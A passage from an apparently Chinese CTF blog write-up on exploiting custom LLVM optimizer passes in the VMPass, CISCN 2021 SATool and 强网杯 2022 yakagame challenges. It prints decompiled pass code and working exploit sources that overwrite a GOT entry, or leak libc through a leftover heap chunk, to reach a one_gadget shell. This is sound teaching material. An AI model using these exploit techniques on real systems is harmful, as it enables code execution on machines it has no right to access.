class="built_in">getZExtValue</span>(v23);</span><br><span class="line">    <span class="keyword">if</span> ( v22 == <span class="number">1</span> )</span><br><span class="line">    v24 = off_20DFD0;</span><br><span class="line">    <span class="keyword">if</span> ( v22 == <span class="number">2</span> )</span><br><span class="line">    v24 = off_20DFC0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v24 == off_20DFD0 )&#123;</span><br><span class="line">    **(_QWORD **)off_20DFD0 = *(_QWORD *)off_20DFC0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( v24 == off_20DFC0 )&#123;</span><br><span class="line">    **(_QWORD **)off_20DFC0 = *(_QWORD *)off_20DFD0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// load</span></span><br><span class="line"><span class="keyword">if</span> ( v19 )&#123;</span><br><span class="line">    v18 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v19);</span><br><span class="line">    <span class="keyword">if</span> ( v18 == <span class="number">1</span> )</span><br><span class="line">    v20 = off_20DFD0;</span><br><span class="line">    <span class="keyword">if</span> ( v18 == <span class="number">2</span> )</span><br><span class="line">    v20 = off_20DFC0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v20 == off_20DFD0 )</span><br><span class="line">    *(_QWORD *)off_20DFC0 = **(_QWORD **)off_20DFD0;</span><br><span class="line"><span class="keyword">if</span> ( v20 == off_20DFC0 )</span><br><span class="line">    *(_QWORD *)off_20DFD0 = **(_QWORD **)off_20DFC0;</span><br><span class="line">          </span><br><span class="line"><span class="comment">// add</span></span><br><span class="line"><span class="keyword">if</span> ( v15 )&#123;</span><br><span class="line">    v14 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v15);</span><br><span class="line">    <span class="keyword">if</span> ( v14 == <span class="number">1</span> )</span><br><span class="line">    v16 = off_20DFD0;</span><br><span class="line">    <span class="keyword">if</span> ( v14 == <span class="number">2</span> )</span><br><span class="line">    v16 = off_20DFC0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v16 )&#123;</span><br><span class="line">    v13 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">1u</span>);</span><br><span class="line">    v12 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v13);</span><br><span class="line">    <span class="keyword">if</span> ( v12 )</span><br><span class="line">    *v16 += llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v12);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>学过<code>VMpwn</code>的师傅会发现，这里可以很容易的实现任意地址写<br>我们前面<code>checksec</code>发现<code>opt-8</code>并没有开启<code>PIE</code>保护以及<code>got</code>表可写。通过分析，在该关键函数每论循环结束时都会执行<code>free</code>函数，于是我们可以选择修改”寄存器”的值为<code>got</code>表地址，然后将里面的值读进”寄存器”，然后再利用<code>add</code>函数将”寄存器”里的<code>free</code>函数改成<code>onegadget</code>，最后写回<code>free</code>的<code>got</code>表中，程序调用<code>free</code>即可执行<code>onegadget</code>。最终的<code>exp</code>如下：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// clang-8 -emit-llvm -S exp.c -o exp.ll</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">store</span><span class="params">(<span class="type">int</span> a)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">load</span><span class="params">(<span class="type">int</span> a)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">o0o0o0o0</span><span class="params">()</span>&#123;</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x77e100</span>);  </span><br><span class="line">    load(<span class="number">1</span>);</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x729ec</span>);</span><br><span class="line">    store(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后执行<code>./opt-8 -load ./VMPass.so -VMPass ./exp.ll</code>即可<code>getshell</code><br>由于没有在比赛中遇到过这种题目，所以不知道远程是怎么打的。听别的师傅说，好像和<code>kernel pwn</code>和<code>qemu</code>逃逸一样，都是直接上传一个<code>elf</code>  </p><h2 id="CISCN-2021-SATool"><a href="#CISCN-2021-SATool" class="headerlink" title="[CISCN 2021] SATool"></a>[CISCN 2021] SATool</h2><p>首先还是按照上面的方法定位到被进行修改过的<code>runOnFunction</code>函数为<code>sub_19D0</code>，点开一看<code>500</code>多行代码，直接看的头大，这时候就十分的考验我们对关键代码的定位了<br>首先在最前面  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Name = (_QWORD *)llvm::Value::<span class="built_in">getName</span>((llvm::Value *)a2);</span><br><span class="line">  <span class="keyword">if</span> ( v3 == <span class="number">8</span> &amp;&amp; *Name == <span class="string">&#x27;r0oDkc4B&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = a2[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">if</span> ( v4 != (llvm::Value *)(a2 + <span class="number">9</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = (<span class="type">char</span> *)v4 - <span class="number">24</span>;</span><br><span class="line">        v82 = v4;</span><br><span class="line">        <span class="keyword">if</span> ( !v4 )</span><br><span class="line">          v5 = <span class="number">0LL</span>;</span><br><span class="line">        v6 = *((_QWORD *)v5 + <span class="number">6</span>);</span><br><span class="line">        v7 = v5 + <span class="number">40</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">char</span> *)v6 != v7 )</span><br></pre></td></tr></table></figure><p>从中我们可以看到要一定要有名为<code>B4ckDo0r</code>（小端序）的函数才可以进行后面的操作<br>后面的程序大概可以看出，根据B4ckDo0r中调用不同的函数从而来执行相应的操作，接下来进行详细的分析<br>我们可以观察到如果传入的是<code>run</code>函数，他所执行的程序中存在以下这段代码：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">((<span class="built_in">void</span> (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD))*byte_2040f8)(</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>);</span><br></pre></td></tr></table></figure><p>这里会执行<code>*byte_2040f8</code>，所以我们想如果可以修改<code>byte_2040f8</code>为<code>one_gadget</code>的地址，执行该段代码时我们就可以<code>getshell</code>了<br>于是对<code>byte_2040f8</code>进行交叉引用，看看什么地方可以对该值进行修改，接下来对能对该地址进行修改的部分代码进行详细分析<br>首先是对<code>fakekey</code>函数的处理,定位到关键部分：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">v76 = byte_204100;</span><br><span class="line"><span class="keyword">if</span> ( *(_BYTE *)(*(_QWORD *)v75 + <span class="number">16LL</span>) == <span class="number">13</span> )</span><br><span class="line">  SExtValue = llvm::APInt::<span class="built_in">getSExtValue</span>((llvm::APInt *)(*(_QWORD *)v75 + <span class="number">24LL</span>));</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  SExtValue = <span class="number">0LL</span>;</span><br><span class="line">byte_204100 = v76 + SExtValue;</span><br><span class="line">*byte_2040f8 = v76 + SExtValue;</span><br></pre></td></tr></table></figure><p>可以看出该函数可以对<code>*byte_2040f8</code>和<code>byte_204100</code>的值加上一个用户自己定义的数，即<code>*byte_2040f8 = byte_204100 + 用户的value</code><br>接下来分析<code>stealkey</code>的关键部分：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( byte_2040f8</span><br><span class="line">  &amp;&amp; !(<span class="number">-1431655765</span></span><br><span class="line">      * (<span class="type">unsigned</span> <span class="type">int</span>)((v15</span><br><span class="line">                      + <span class="number">24</span> * v65</span><br><span class="line">                      - <span class="number">24LL</span> * v66</span><br><span class="line">                      - (v8</span><br><span class="line">                      - <span class="number">24</span> * (<span class="type">unsigned</span> __int64)(*(_DWORD *)(v8 + <span class="number">20</span>) &amp; <span class="number">0xFFFFFFF</span>))) &gt;&gt; <span class="number">3</span>)) )</span><br><span class="line">&#123;</span><br><span class="line">  byte_204100 = *byte_2040f8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里会将<code>*byte_2040f8</code>赋值给<code>byte_204100</code><br>最后是对<code>save</code>部分的分析，其有下面这段关键代码：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="number">-1431655765</span> * (<span class="type">unsigned</span> <span class="type">int</span>)((v15 + <span class="number">24</span> * v18 - <span class="number">24</span> * (<span class="type">unsigned</span> __int64)NumTotalBundleOperands - v20) &gt;&gt; <span class="number">3</span>) == <span class="number">2</span> )&#123;</span><br><span class="line">  v21 = *(_BYTE *)(v8 + <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v21 == <span class="number">79</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v22 = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v21 != <span class="number">29</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_143;</span><br><span class="line">    v22 = <span class="number">-2LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v23 = v15</span><br><span class="line">      + <span class="number">24</span> * v22</span><br><span class="line">      - <span class="number">24LL</span> * (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumTotalBundleOperands</span>((llvm::CallBase *)(v6 - <span class="number">24</span>));</span><br><span class="line">  v24 = (__int64 *)(v8 - <span class="number">24LL</span> * (*(_DWORD *)(v8 + <span class="number">20</span>) &amp; <span class="number">0xFFFFFFF</span>));</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="number">-1431655765</span> * (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">unsigned</span> __int64)(v23 - (_QWORD)v24) &gt;&gt; <span class="number">3</span>)) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_154;</span><br><span class="line">  <span class="keyword">if</span> ( (*(_DWORD *)(v8 + <span class="number">20</span>) &amp; <span class="number">0xFFFFFFF</span>) == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_153;</span><br><span class="line">  v25 = *v24;</span><br><span class="line">  v26 = *(_BYTE *)(v8 + <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v26 == <span class="number">79</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v27 = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v26 != <span class="number">29</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_144;</span><br><span class="line">    v27 = <span class="number">-2LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v28 = v15</span><br><span class="line">      + <span class="number">24</span> * v27</span><br><span class="line">      - <span class="number">24LL</span> * (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumTotalBundleOperands</span>((llvm::CallBase *)(v6 - <span class="number">24</span>));</span><br><span class="line">  v29 = v8 - <span class="number">24LL</span> * (*(_DWORD *)(v8 + <span class="number">20</span>) &amp; <span class="number">0xFFFFFFF</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">-1431655765</span> * (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">unsigned</span> __int64)(v28 - v29) &gt;&gt; <span class="number">3</span>) &lt;= <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_154;</span><br><span class="line">  <span class="keyword">if</span> ( (*(_DWORD *)(v8 + <span class="number">20</span>) &amp; <span class="number">0xFFFFFFF</span>u) &lt;= <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_153;</span><br><span class="line">  v30 = *(_QWORD *)(v29 + <span class="number">24</span>);</span><br><span class="line">  <span class="built_in">sub_2430</span>(&amp;src, v25);</span><br><span class="line">  <span class="built_in">sub_2430</span>(v84, v30);</span><br><span class="line">  v31 = n;</span><br><span class="line">  v32 = <span class="built_in">malloc</span>(<span class="number">0x18</span>uLL);</span><br><span class="line">  v32[<span class="number">2</span>] = byte_2040f8;</span><br><span class="line">  byte_2040f8 = v32;</span><br><span class="line">  v33 = (<span class="type">char</span> *)src;</span><br><span class="line">  <span class="built_in">memcpy</span>(v32, src, v31);</span><br><span class="line">  v34 = v32 + <span class="number">1</span>;</span><br><span class="line">  v35 = (<span class="type">char</span> *)v84[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">memcpy</span>(v34, v84[<span class="number">0</span>], (<span class="type">size_t</span>)v84[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( v35 != &amp;v85 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(v35)</span></span>;</span><br><span class="line">    v33 = (<span class="type">char</span> *)src;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v33 != v88 )</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(v33)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一行的代码意思是要求<code>save</code>函数要有<code>2</code>个参数，从代码中我们可以看出<code>byte_2040f8</code>指向一个新申请的<code>0x20</code>大小的堆块，而后面的操作看的也不是太懂，因为前面看的也不是很懂，于是用<code>gdb</code>调试了一下，测试脚本：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// clang-8 -S -emit-llvm exp.c -o exp.ll</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">save</span><span class="params">(<span class="type">char</span> *a, <span class="type">char</span> *b)</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">B4ckDo0r</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>gdb</code>中查看<code>byte_2040f8</code>：  </p><img src="/2024/03/15/llvm/4.png" class="" title="我的图图呢">  <p>可以看到<code>byte_2040f8</code>指向一个新<code>malloc</code>的堆块，堆块大小为<code>0x18</code>，堆块的内容为<code>save</code>函数的第一和第二个参数，回到最开始程序刚进入到对<code>save</code>函数的进行处理的时候，我们看看堆块的布局：  </p><img src="/2024/03/15/llvm/5.png" class="" title="我的图图呢"><p>可以看到<code>unsortedbin</code>中存在一个堆块，<code>tcache</code>中有<code>7</code>个<code>0x20</code>大小的堆块，如果我们将<code>7</code>个堆块申请出来，再用<code>save</code>函数申请<code>0x20</code>大小的堆块，堆管理系统则会直接切割<code>unsortedbin</code>中的堆块进行分配，此时申请出来的堆块会残留着之前<code>unsortedbin</code>在<code>fd</code>上有关<code>libc</code>的地址，即我们可以令<code>*byte_2040f8</code>为<code>libc</code>上的一个地址<br>此时我们可利用<code>stealkey</code>函数将<code>*byte_2040f8</code>上的值赋值给<code>byte_204100</code>，代码如下：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// clang-8 -S -emit-llvm exp.c -o exp.ll</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">save</span><span class="params">(<span class="type">char</span> *a, <span class="type">char</span> *b)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">takeaway</span><span class="params">(<span class="type">char</span> *c)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">stealkey</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fakekey</span><span class="params">(<span class="type">int</span> d)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">B4ckDo0r</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">stealkey</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下：  </p><img src="/2024/03/15/llvm/6.png" class="" title="我的图图呢">  <p>再利用<code>fakekey</code>函数<code>*byte_2040f8 = byte_204100 - one_gadget与byte_204100上有关libc地址的偏移</code>，即可另<code>*byte_2040f8</code>的值为<code>one_gadget</code>的地址，最后使用<code>run</code>函数执行<code>one_gadget</code>直接<code>getshell</code>。最终<code>exp</code>如下：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// clang-8 -S -emit-llvm exp.c -o exp.ll</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">save</span><span class="params">(<span class="type">char</span> *a, <span class="type">char</span> *b)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">takeaway</span><span class="params">(<span class="type">char</span> *c)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">stealkey</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fakekey</span><span class="params">(<span class="type">int</span> d)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">B4ckDo0r</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">stealkey</span>();</span><br><span class="line">    <span class="built_in">fakekey</span>(<span class="number">-0x1090f2</span>);</span><br><span class="line">    <span class="built_in">run</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="强网杯-2022-yakagame"><a href="#强网杯-2022-yakagame" class="headerlink" title="[强网杯 2022] yakagame"></a>[强网杯 2022] yakagame</h2><p>这道题的<code>PASS</code>注册的名称并不能直接在<code>start</code>函数中找打，看了<code>winmt</code>师傅的文章发现可以对<code>__cxa_atexit</code>函数“交叉引用”来定位，如下图：  </p><img src="/2024/03/15/llvm/7.png" class="" title="我的图图呢">  <p>可以看见<code>PASS</code>注册的名称为<code>ayaka</code>（没事干给<code>ida64</code>换了一个主题哈哈哈）。接下来对主要函数进行分析，用上面题目的方法定位到<code>sub_C880</code>即为重写的<code>runOnFunction</code>函数。<br>还是和之前的方法一样，发现程序主要是对<code>gamestart</code>函数的定义进行分析和操作，接下来详细分析各个部分<br>对<code>fight</code>函数的处理：  </p><img src="/2024/03/15/llvm/8.png" class="" title="我的图图呢">  <p>该函数只能有一个参数，以该参数作为索引，从<code>weaponlist</code>数组中取出一个数<code>v53</code>与<code>boss</code>进行比较：  </p><ul><li>如果<code>v53</code>的值小于<code>boss</code>，则输出<code>loss</code>  </li><li>如果<code>v53</code>的值大于等于<code>boss</code>，则输出<code>win</code>，并进行赋值操作：<code>*score = v53 - boss</code>  </li><li>如果<code>*score &gt; 0x12345678</code>，则会进入<code>backdoor</code>函数</li></ul><p>接下来就看看这个<code>backdoor</code>函数：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">backdoor</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;wow!! this is you gift&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">system</span>(cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以想到，如果我们可以控制<code>cmd</code>的值并且执行<code>backdoor</code>函数，我们就能够<code>getshell</code><br>对<code>merge</code>函数的处理：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( (std::<span class="keyword">operator</span>==&lt;<span class="type">char</span>&gt;(v58, <span class="string">&quot;merge&quot;</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">  v52 = llvm::CallBase::<span class="built_in">getNumOperands</span>(v60);</span><br><span class="line">  <span class="keyword">if</span> ( v52 != <span class="number">3</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  v15 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v60, <span class="number">0</span>);</span><br><span class="line">  v51 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v15);</span><br><span class="line">  v50 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v51);<span class="comment">// 参数一</span></span><br><span class="line">  v16 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v60, <span class="number">1u</span>);</span><br><span class="line">  v51 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v16);</span><br><span class="line">  v49 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v51);<span class="comment">// 参数二</span></span><br><span class="line">  weaponlist[v50] += weaponlist[v49];</span><br><span 